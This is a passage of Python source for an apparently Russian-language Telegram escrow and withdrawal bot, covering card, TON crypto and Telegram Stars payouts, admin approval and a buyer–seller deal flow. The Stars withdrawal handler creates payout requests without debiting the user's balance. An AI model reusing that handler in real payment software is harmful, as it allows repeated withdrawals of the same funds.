    await state.update_data(dest=dest)
    await state.set_state(WithdrawFlow.card_confirm)
    await message.answer(
        f"{header()}\n"
        "💳 <b>ПРОВЕРКА РЕКВИЗИТОВ</b>\n\n"
        f"Ты указал: <code>{html.escape(dest)}</code>\n\n"
        "<blockquote>Всё верно?</blockquote>",
        reply_markup=confirm_kb(),
    )


@dp.callback_query(WithdrawFlow.card_confirm, F.data == "wd_retry")
async def cb_wd_card_retry(call: CallbackQuery, state: FSMContext):
    await state.set_state(WithdrawFlow.card_number)
    await call.answer()
    await call.message.edit_text(
        f"{header()}\n"
        "💳 <b>ВЫВОД НА КАРТУ</b>\n\n"
        "<blockquote>Введи номер карты "
        "или телефона заново.</blockquote>",
        reply_markup=back_menu(),
    )


@dp.callback_query(WithdrawFlow.card_confirm, F.data == "wd_confirm")
async def cb_wd_card_confirm(call: CallbackQuery, state: FSMContext):
    balance = await get_balance(call.from_user.id)
    if balance <= 0:
        await state.clear()
        await call.answer()
        await call.message.edit_text(
            f"{header()}\n"
            "⚠️ <b>НЕДОСТАТОЧНО СРЕДСТВ</b>\n\n"
            "💳 Баланс: <b>0.00 USDT</b>\n\n"
            "<blockquote>Пополни баланс "
            "и вернись к выводу.</blockquote>",
            reply_markup=back_menu(),
        )
        return
    await state.set_state(WithdrawFlow.card_amount)
    await call.answer()
    await call.message.edit_text(
        f"{header()}\n"
        "💰 <b>СУММА ВЫВОДА · 2/2</b>\n\n"
        f"💳 Доступно: <b>{money(balance)}</b>\n\n"
        "<blockquote>Введи сумму для вывода.\n"
        "Не больше доступного.</blockquote>",
        reply_markup=back_menu(),
    )


@dp.message(WithdrawFlow.card_amount)
async def wd_card_amount(message: Message, state: FSMContext):
    amount = parse_amount(message.text or "")
    if not amount:
        await message.answer("❌ Введи положительное число.")
        return

    balance = await get_balance(message.from_user.id)
    if amount > balance:
        await message.answer(
            f"❌ Недостаточно средств.\nБаланс: <b>{money(balance)}</b>"
        )
        return

    data = await state.get_data()
    dest = data.get("dest", "")
    ok, _ = await debit_balance(
        message.from_user.id, amount, "withdraw_card"
    )
    if not ok:
        await message.answer("❌ Недостаточно средств.")
        return

    withdraw_id = await create_withdrawal(
        message.from_user.id, "card", dest, amount
    )
    await state.clear()

    await message.answer(
        f"{header()}\n"
        "✅ <b>ЗАЯВКА СОЗДАНА</b>\n\n"
        f"🆔 Заявка: <code>{withdraw_id}</code>\n"
        f"💳 Реквизиты: <code>{html.escape(dest)}</code>\n"
        f"💰 Сумма: <b>{money(amount)}</b>\n"
        "📌 Статус: <b>В обработке</b>\n\n"
        "<blockquote>⏱ Обычно до 24 часов.\n"
        "Уведомление придёт сюда.</blockquote>",
        reply_markup=back_menu(),
    )

    uname = message.from_user.username or str(message.from_user.id)
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(
                admin_id,
                f"{header()}\n"
                "💸 <b>ВЫВОД НА КАРТУ</b>\n\n"
                f"👤 Пользователь: @{html.escape(uname)}\n"
                f"💳 Реквизиты: <code>{html.escape(dest)}</code>\n"
                f"💰 Сумма: <b>{money(amount)}</b>\n"
                f"🆔 Заявка: <code>{withdraw_id}</code>",
                reply_markup=admin_withdraw_kb(withdraw_id),
            )
        except Exception:
            logger.exception("Could not notify admin %s", admin_id)


@dp.callback_query(F.data == "wd_crypto")
async def cb_wd_crypto(call: CallbackQuery, state: FSMContext):
    await state.set_state(WithdrawFlow.crypto_number)
    await call.answer()
    await call.message.edit_text(
        f"{header()}\n"
        "🪙 <b>ВЫВОД НА КРИПТУ · 1/2</b>\n\n"
        "<blockquote>Введи адрес USDT (TON).</blockquote>\n\n"
        "⚠️ Убедись, что адрес в сети TON,\n"
        "иначе средства потеряются.",
        reply_markup=back_menu(),
    )


@dp.message(WithdrawFlow.crypto_number)
async def wd_crypto_number(message: Message, state: FSMContext):
    dest = (message.text or "").strip()
    if not dest or len(dest) > 200 or dest.startswith("/"):
        await message.answer("❌ Введи корректный адрес.")
        return
    await state.update_data(dest=dest)
    await state.set_state(WithdrawFlow.crypto_confirm)
    await message.answer(
        f"{header()}\n"
        "🪙 <b>ПРОВЕРКА РЕКВИЗИТОВ</b>\n\n"
        f"Ты указал: <code>{html.escape(dest)}</code>\n\n"
        "<blockquote>Всё верно?</blockquote>",
        reply_markup=confirm_kb(),
    )


@dp.callback_query(WithdrawFlow.crypto_confirm, F.data == "wd_retry")
async def cb_wd_crypto_retry(call: CallbackQuery, state: FSMContext):
    await state.set_state(WithdrawFlow.crypto_number)
    await call.answer()
    await call.message.edit_text(
        f"{header()}\n"
        "🪙 <b>ВЫВОД НА КРИПТУ</b>\n\n"
        "<blockquote>Введи адрес заново.</blockquote>",
        reply_markup=back_menu(),
    )


@dp.callback_query(WithdrawFlow.crypto_confirm, F.data == "wd_confirm")
async def cb_wd_crypto_confirm(call: CallbackQuery, state: FSMContext):
    balance = await get_balance(call.from_user.id)
    if balance <= 0:
        await state.clear()
        await call.answer()
        await call.message.edit_text(
            f"{header()}\n"
            "⚠️ <b>НЕДОСТАТОЧНО СРЕДСТВ</b>\n\n"
            "💳 Баланс: <b>0.00 USDT</b>\n\n"
            "<blockquote>Пополни баланс "
            "и вернись к выводу.</blockquote>",
            reply_markup=back_menu(),
        )
        return
    await state.set_state(WithdrawFlow.crypto_amount)
    await call.answer()
    await call.message.edit_text(
        f"{header()}\n"
        "💰 <b>СУММА ВЫВОДА · 2/2</b>\n\n"
        f"💳 Доступно: <b>{money(balance)}</b>\n\n"
        "<blockquote>Введи сумму для вывода.</blockquote>",
        reply_markup=back_menu(),
    )


@dp.message(WithdrawFlow.crypto_amount)
async def wd_crypto_amount(message: Message, state: FSMContext):
    amount = parse_amount(message.text or "")
    if not amount:
        await message.answer("❌ Введи положительное число.")
        return
    balance = await get_balance(message.from_user.id)
    if amount > balance:
        await message.answer(
            f"❌ Недостаточно средств.\nБаланс: <b>{money(balance)}</b>"
        )
        return
    data = await state.get_data()
    dest = data.get("dest", "")
    ok, _ = await debit_balance(
        message.from_user.id, amount, "withdraw_crypto"
    )
    if not ok:
        await message.answer("❌ Недостаточно средств.")
        return
    withdraw_id = await create_withdrawal(
        message.from_user.id, "crypto", dest, amount
    )
    await state.clear()

    await message.answer(
        f"{header()}\n"
        "✅ <b>ЗАЯВКА СОЗДАНА</b>\n\n"
        f"🆔 Заявка: <code>{withdraw_id}</code>\n"
        f"🪙 Кошелёк: <code>{html.escape(dest)}</code>\n"
        f"💰 Сумма: <b>{money(amount)}</b>\n"
        "📌 Статус: <b>В обработке</b>\n\n"
        "<blockquote>⏱ Обычно до 24 часов.\n"
        "Уведомление придёт сюда.</blockquote>",
        reply_markup=back_menu(),
    )

    uname = message.from_user.username or str(message.from_user.id)
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(
                admin_id,
                f"{header()}\n"
                "💸 <b>ВЫВОД НА КРИПТУ</b>\n\n"
                f"👤 Пользователь: @{html.escape(uname)}\n"
                f"🪙 Кошелёк: <code>{html.escape(dest)}</code>\n"
                f"💰 Сумма: <b>{money(amount)}</b>\n"
                f"🆔 Заявка: <code>{withdraw_id}</code>",
                reply_markup=admin_withdraw_kb(withdraw_id),
            )
        except Exception:
            logger.exception("Could not notify admin %s", admin_id)


@dp.callback_query(F.data == "wd_stars")
async def cb_wd_stars(call: CallbackQuery, state: FSMContext):
    await state.set_state(WithdrawFlow.stars_amount)
    balance = await get_balance(call.from_user.id)
    await call.answer()
    await call.message.edit_text(
        f"{header()}\n"
        "⭐ <b>ВЫВОД ЗВЁЗДАМИ</b>\n\n"
        f"💰 Доступно: <b>{money(balance)}</b>\n\n"
        "<blockquote>📋 Меню покупки звёзд\n"
        "⭐ 50 — 1.00 USDT\n"
        "⭐ 100 — 2.00 USDT\n"
        "⭐ 250 — 5.00 USDT\n"
        "⭐ 500 — 10.00 USDT\n"
        "⭐ 1000 — 20.00 USDT\n"
        "⭐ 2500 — 50.00 USDT</blockquote>\n\n"
        "Введи количество звёзд.",
        reply_markup=back_menu(),
    )


@dp.message(WithdrawFlow.stars_amount)
async def wd_stars_amount(message: Message, state: FSMContext):
    try:
        stars = int((message.text or "").strip().replace(" ", ""))
        if stars <= 0:
            raise ValueError
    except (ValueError, TypeError):
        await message.answer("❌ Введи целое число звёзд.")
        return

    price = (Decimal(stars) * STARS_RATE).quantize(Decimal("0.01"))
    balance = await get_balance(message.from_user.id)
    await state.clear()

    if balance < price:
        await message.answer(
            f"{header()}\n"
            "⚠️ <b>НЕДОСТАТОЧНО СРЕДСТВ</b>\n\n"
            f"💳 Баланс: <b>{money(balance)}</b>\n"
            f"💵 Требуется: <b>{money(price)}</b>\n\n"
            "<blockquote>Пополни баланс "
            "и вернись к выводу.</blockquote>",
            reply_markup=back_menu(),
        )
        return

    withdraw_id = await create_withdrawal(
        message.from_user.id, "stars", f"{stars} звёзд", price
    )
    await message.answer(
        f"{header()}\n"
        "⭐ <b>ЗАЯВКА НА ЗВЁЗДЫ</b>\n\n"
        f"🆔 Заявка: <code>{withdraw_id}</code>\n"
        f"⭐ Количество: <b>{stars}</b>\n"
        f"💰 Сумма: <b>{money(price)}</b>\n"
        "📌 Статус: <b>В обработке</b>\n\n"
        "<blockquote>⏱ Обычно до 24 часов.\n"
        "Уведомление придёт сюда.</blockquote>",
        reply_markup=back_menu(),
    )


# =========================
# ADMIN WITHDRAWAL STATUS
# =========================

@dp.callback_query(F.data.startswith("admin_wd_paid:"))
async def cb_admin_wd_paid(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS:
        await call.answer("Недостаточно прав", show_alert=True)
        return

    withdraw_id = int(call.data.split(":", 1)[1])
    ok, row = await set_withdrawal_status(withdraw_id, "marked_paid")
    if not ok:
        await call.answer("Заявка уже обработана.", show_alert=True)
        return

    await call.answer("Отмечено")
    await call.message.answer(
        f"✅ Заявка #{withdraw_id} отмечена как выплаченная."
    )
    try:
        await bot.send_message(
            row["user_id"],
            f"{header()}\n"
            f"📣 Заявка на вывод #{withdraw_id} обработана.",
        )
    except Exception:
        logger.exception("Could not notify user")


@dp.callback_query(F.data.startswith("admin_wd_reject:"))
async def cb_admin_wd_reject(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS:
        await call.answer("Недостаточно прав", show_alert=True)
        return

    withdraw_id = int(call.data.split(":", 1)[1])
    ok, row = await set_withdrawal_status(withdraw_id, "rejected")
    if not ok:
        await call.answer("Заявка уже обработана.", show_alert=True)
        return

    try:
        await credit_balance(
            row["user_id"],
            Decimal(row["amount"]),
            "withdraw_refund",
            f"withdraw:{withdraw_id}",
        )
    except Exception:
        logger.exception("Could not refund user")

    await call.answer("Отклонено")
    await call.message.answer(f"❌ Заявка #{withdraw_id} отклонена.")
    try:
        await bot.send_message(
            row["user_id"],
            f"{header()}\n"
            f"❌ Заявка на вывод #{withdraw_id} отклонена.\n"
            f"Средства возвращены на баланс.",
        )
    except Exception:
        logger.exception("Could not notify user")


# =========================
# DEAL FLOW
# =========================

@dp.callback_query(F.data.startswith("deal_pay:"))
async def cb_deal_pay(call: CallbackQuery):
    deal_id = int(call.data.split(":", 1)[1])
    deal = await get_deal(deal_id)
    if not deal:
        await call.answer("Сделка не найдена.", show_alert=True)
        return
    if call.from_user.id != deal["buyer_id"]:
        await call.answer("Оплачивает покупатель.", show_alert=True)
        return
    if deal["status"] != "created":
        await call.answer("Сделка уже оплачена.", show_alert=True)
        return

    amount = Decimal(deal["amount"])
    ok, _ = await debit_balance(
        call.from_user.id, amount, "deal_hold", f"deal:{deal_id}"
    )
    if not ok:
        await call.answer("Недостаточно средств. Пополни.", show_alert=True)
        return

    await set_deal_status(deal_id, "funded")
    await call.answer()
    await call.message.edit_text(
        f"{header()}\n"
        "✅ <b>СРЕДСТВА ВНЕСЕНЫ</b>\n\n"
        f"💰 Сумма: <b>{money(amount)}</b>\n\n"
        "<blockquote>📌 Средства заморожены.\n"
        "📣 Продавец уведомлён.\n"
        "⏳ Ждём отправки товара.</blockquote>\n\n"
        "После получения нажми «Я получил товар»."
    )

    uname = call.from_user.username or str(call.from_user.id)
    try:
        await bot.send_message(
            deal["seller_id"],
            f"{header()}\n"
            "💰 <b>ПОКУПАТЕЛЬ ОПЛАТИЛ</b>\n\n"
            f"👥 Покупатель: @{html.escape(uname)}\n"
            f"💰 Сумма: <b>{money(amount)}</b>\n"
            f"📝 Товар: {html.escape(deal['item'])}\n\n"
            "<blockquote>📦 Передай товар покупателю.\n"
            "После отправки нажми «Я отправил товар».</blockquote>",
            reply_markup=ship_kb(deal_id),
        )
    except Exception:
        logger.exception("Could not notify seller")


@dp.callback_query(F.data.startswith("deal_ship:"))
async def cb_deal_ship(call: CallbackQuery):
    deal_id = int(call.data.split(":", 1)[1])
    deal = await get_deal(deal_id)
    if not deal:
        await call.answer("Сделка не найдена.", show_alert=True)
        return
    if call.from_user.id != deal["seller_id"]:
        await call.answer("Подтверждает продавец.", show_alert=True)
        return
    if deal["status"] != "funded":
        await call.answer("Сначала покупатель вносит средства.",
                          show_alert=True)
        return

    await set_deal_status(deal_id, "shipped")
    await call.answer()
    await call.message.edit_text(
        f"{header()}\n"
        "📦 <b>ОТПРАВКА ПОДТВЕРЖДЕНА</b>\n\n"
        "📌 Статус: <b>Товар отправлен</b>\n\n"
        "<blockquote>📣 Покупатель уведомлён.\n"
        "⏳ Ждём подтверждения.</blockquote>"
    )
    uname = call.from_user.username or str(call.from_user.id)
    try:
        await bot.send_message(
            deal["buyer_id"],
            f"{header()}\n"
            "📦 <b>ПРОДАВЕЦ ОТПРАВИЛ ТОВАР</b>\n\n"
            f"👤 Продавец: @{html.escape(uname)}\n"
            f"📝 Товар: {html.escape(deal['item'])}\n\n"
            "<blockquote>Проверь товар.\n"
            "Если всё в порядке — нажми "
            "«Я получил товар».</blockquote>",
            reply_markup=receive_kb(deal_id),
        )
    except Exception:
        logger.exception("Could not notify buyer")


@dp.callback_query(F.data.startswith("deal_recv:"))
async def cb_deal_recv(call: CallbackQuery):
    deal_id = int(call.data.split(":", 1)[1])
    deal = await get_deal(deal_id)
    if not deal:
        await call.answer("Сделка не найдена.", show_alert=True)
        return
    if call.from_user.id != deal["buyer_id"]:
        await call.answer("Подтверждает покупатель.", show_alert=True)
        return
    if deal["status"] != "shipped":
        await call.answer("Продавец ещё не подтвердил отправку.",
                          show_alert=True)
        return

    amount = Decimal(deal["amount"])
    await credit_balance(
        deal["seller_id"], amount, "deal_release", f"deal:{deal_id}"
    )
    await set_deal_status(deal_id, "completed")

    await call.answer()
    await call.message.edit_text(
        f"{header()}\n"
        "🎉 <b>СДЕЛКА ЗАВЕРШЕНА</b>\n\n"
        "📌 Статус: <b>Успешно</b>\n\n"
        "<blockquote>💰 Деньги переведены продавцу.\n"
        "📁 Сделка закрыта.</blockquote>\n\n"
        "🙏 Спасибо за использование!"
    )

    seller_balance = await get_balance(deal["seller_id"])
    try:
        await bot.send_message(
            deal["seller_id"],
            f"{header()}\n"
            "🎉 <b>СДЕЛКА ЗАВЕРШЕНА</b>\n\n"
            f"💰 Зачислено: <b>{money(amount)}</b>\n"
            f"💳 Текущий баланс: <b>{money(seller_balance)}</b>\n\n"
            "<blockquote>💸 Зайди в «Вывод», выбери способ\n"
            "и получи деньги.</blockquote>",
        )
    except Exception:
        logger.exception("Could not notify seller")

    try:
        await bot.send_message(
            deal["buyer_id"],
            f"{header()}\n"
            "🎉 <b>СДЕЛКА ЗАВЕРШЕНА</b>\n\n"
            "📌 Статус: <b>Успешно</b>\n\n"
            "<blockquote>💰 Деньги переведены продавцу.</blockquote>\n\n"
            "🙏 Спасибо за покупку!",
        )
    except Exception:
        logger.exception("Could not notify buyer")


@dp.callback_query(F.data.startswith("deal_dispute:"))
async def cb_deal_dispute(call: CallbackQuery):
    deal_id = int(call.data.split(":", 1)[1])
    deal = await get_deal(deal_id)
    if not deal:
        await call.answer("Сделка не найдена.", show_alert=True)
        return
    if call.from_user.id not in (deal["seller_id"], deal["buyer_id"]):
        await call.answer("Ты не участник этой сделки.", show_alert=True)
        return
    if deal["status"] in ("completed", "disputed"):
        await call.answer("Сделка уже завершена или в споре.",
                          show_alert=True)
        return

    await set_deal_status(deal_id, "disputed")
    await call.answer("Спор зарегистрирован")
    await call.message.answer(
        f"{header()}\n"
        f"⚠️ <b>СПОР ПО СДЕЛКЕ #{deal_id}</b>\n\n"
        "<blockquote>Администратор проверит ситуацию\n"
        "и свяжется с тобой.</blockquote>"
    )

    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(
                admin_id,
                f"{header()}\n"
                "⚠️ <b>СПОР ПО СДЕЛКЕ</b>\n\n"
                f"🆔 Сделка: <code>{deal_id}</code>\n"
                f"👤 Инициатор: <code>{call.from_user.id}</code>\n"
                f"💰 Сумма: <b>{money(deal['amount'])}</b>\n"
                f"📝 Товар: {html.escape(deal['item'])}"
            )
        except Exception:
            logger.exception("Could not notify admin about dispute")


# =========================
# FALLBACK
# =========================

@dp.message()
async def unknown_message(message: Message):
    await message.answer(
        f"{header()}\n"
        "❓ Не понял команду.\n"
        "Используй меню или /start.",
        reply_markup=main_menu(),
    )


# =========================
# MAIN
# =========================

async def main():
    await init_db()
    logger.info("Starting %s", BRAND)
    await dp.start_polling(bot)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Bot stopped")